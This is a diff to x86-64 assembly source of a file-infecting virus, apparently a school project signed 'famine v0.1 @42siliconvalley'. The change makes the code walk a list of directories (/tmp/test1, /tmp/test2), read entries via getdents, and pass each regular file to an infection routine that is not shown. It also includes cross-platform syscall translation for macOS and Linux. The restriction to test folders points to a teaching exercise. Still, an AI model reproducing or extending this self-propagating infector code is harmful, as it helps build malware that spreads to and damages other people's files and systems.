@@ -46,8 +46,6 @@ _host:          lea         rdi, [rel hello]
 hello           db          "hello world",33,10,0
                 times 128 - $ + strlen db 0x90
 
-
-
 _start:
                 push        rdi
                 push        rsi
@@ -63,11 +61,13 @@ _start:
                 push        rax
 
                 lea         rdi, [rel slash_tmp]
+.opendir:
+                mov         r14, rdi
                 mov         rsi, O_RDONLY | O_DIRECTORY
                 mov         rax, __NR_open
                 translate_syscall
                 test        rax, rax
-                jl          _return
+                jl          .nextdir
 
                 mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
 
@@ -75,49 +75,17 @@ _start:
                 mov         rax, __NR_fchdir
                 translate_syscall
                 test        rax, rax
-                jl          _return
+                jnz         .closedir
 
 
-;
-;on macOS getdirentries() syscall writes an array of structures of this type:
-;
-;     struct dirent { /* when _DARWIN_FEATURE_64_BIT_INODE is NOT defined */
-;             ino_t      d_ino;                /* file number of entry */           <<-- 4 bytes
-;             __uint16_t d_reclen;             /* length of this record */          <<-- 2 bytes    <<-- should use this value to navigate to next structure
-;             __uint8_t  d_type;               /* file type, see below */           <<-- 1 byte
-;             __uint8_t  d_namlen;             /* length of string in d_name */     <<-- 1 byte
-;             char    d_name[255 + 1];   /* name must be no longer than this */     <<-- might be followed by additional null (4 byte alignment ?) bytes
-;     };
-;
-;
-
-
-;on Linux getdents() syscall writes an array of structures of this type:
-;
-;           struct linux_dirent {
-;               unsigned long  d_ino;     /* Inode number */                        <<-- 8 bytes
-;               unsigned long  d_off;     /* Offset to next linux_dirent */         <<-- 8 bytes
-;               unsigned short d_reclen;  /* Length of this linux_dirent */         <<-- 2 bytes    <<-- use this to go to next structure
-;               char           d_name[];  /* Filename (null-terminated) */
-;                                 /* length is actually (d_reclen - 2 -
-;                                    offsetof(struct linux_dirent, d_name)) */
-;               /*
-;               char           pad;       // Zero padding byte
-;               char           d_type;    // File type (only since Linux                <<-- 1 byte, last byte of structure @ d_reclen-1
-;                                         // 2.6.4); offset is (d_reclen - 1)
-;               */
-;           }
-
-
-
-scandir:        lea         r10, [rsp-0x28]                     ;long *basep for macos
+.readdir:       lea         r10, [rsp-0x28]                     ;long *basep for macos
                 mov         rdx, BUF_SIZE
                 lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                 mov         rdi, [rsp-0x30]                     ;directory fd
                 mov         rax, __NR_getdents
                 translate_syscall
                 test        rax, rax
-                jle         .close
+                jle         .closedir
 
                 xor         r13, r13
                 mov         r12, rax
@@ -143,20 +111,27 @@ scandir:        lea         r10, [rsp-0x28]                     ;long *basep for
                 add         r13, rdx
 
                 cmp         al, DT_REG
-                jne         .next
+                jne         .nextfile
 
                 call        process
-.next:
+.nextfile:
                 cmp         r13, r12
                 jl          .file
-                jmp         scandir
+                jmp         .readdir
 
-.close:         mov         rdi, [rsp-0x30]
+.closedir:      mov         rdi, [rsp-0x30]
                 mov         rax, __NR_close
                 translate_syscall
-_return:
-                pop         rax
+.nextdir:
+                xor         ecx, ecx
+                mul         ecx
+                dec         ecx
+                mov         rdi, r14
+                repnz       scasb
+                cmp         byte [rdi], 0
+                jnz         .opendir
 
+                pop         rax
                 pop         rdx
                 pop         rcx
                 pop         rsi
@@ -419,7 +394,7 @@ _translate_syscall:                                             ; expecting r15 
                 ret
 
 
-slash_tmp   db "/tmp",0
+slash_tmp   db "/tmp/test1",0,"/tmp/test2",0,0
 signature   db "famine v0.1 @42siliconvalley",0
 
 _platform:
